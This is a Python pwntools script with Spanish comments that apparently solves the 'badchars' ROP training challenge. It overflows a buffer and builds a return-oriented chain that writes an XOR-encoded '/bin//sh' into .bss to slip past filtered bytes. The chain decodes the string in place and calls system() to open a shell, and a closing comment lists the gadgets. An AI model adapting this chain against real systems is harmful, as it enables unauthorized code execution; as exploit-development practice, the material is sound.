from pwn import *

e = ELF('./badchars')
r = process('./badchars')
#gdb.attach(r)
bads = []
badchars = ["b", "i", "c", "/"," ", "f",  "n", "s"]
for i in badchars:
    x = hex(ord(i))
    bads.append(x)

print "#### BADCHARACTERS ####"
print bads

slashbinsh = []

for i in "/bin//sh":
    x = ord(i) ^ 0x44
    slashbinsh.append(chr(x))
slashbinsh = ''.join(slashbinsh)

print "/bin//sh, encodeado"
print slashbinsh

#gardgets
bss = 0x601080
popr12r13 = 0x400b3b
movr13r12 = 0x400b34

popr14r15 = 0x400b40
xorr15r14 = 0x400b30

poprdi = 0x400b39
system = e.symbols['system']
ret_main = 0x4009de
#offset a crash
payload = ""
payload += "A" * 40 #offset a crash
#escribiendo el string encodeado
payload += p64(popr12r13)
payload += slashbinsh
payload += p64(bss)
payload += p64(movr13r12)

#decodeando
for i in range(0, 8):
    payload += p64(popr14r15)
    payload += p64(0x44)
    payload += p64(bss+i)
    payload += p64(xorr15r14)

#llamado a system 

payload += p64(poprdi)
payload += p64(bss)
payload += p64(ret_main)
payload += p64(system)



#explotando

r.sendlineafter("> ", payload)
r.interactive()
#ropeando
'''
para escribir:

0x0000000000400b34 <+4>:     mov    QWORD PTR [r13+0x0],r12
0x0000000000400b38 <+8>:     ret  
0x0000000000400b3b <+11>:    pop    r12
0x0000000000400b3d <+13>:    pop    r13
0x0000000000400b3f <+15>:    ret  


para encodear :

0x0000000000400b30 <+0>:     xor    BYTE PTR [r15],r14b
0x0000000000400b33 <+3>:  

0x0000000000400b40 <+16>:    pop    r14
0x0000000000400b42 <+18>:    pop    r15
0x0000000000400b44 <+20>:    ret  

para llamar a system con string

0x0000000000400b39 <+9>:     pop    rdi
0x0000000000400b3a <+10>:    ret    



'''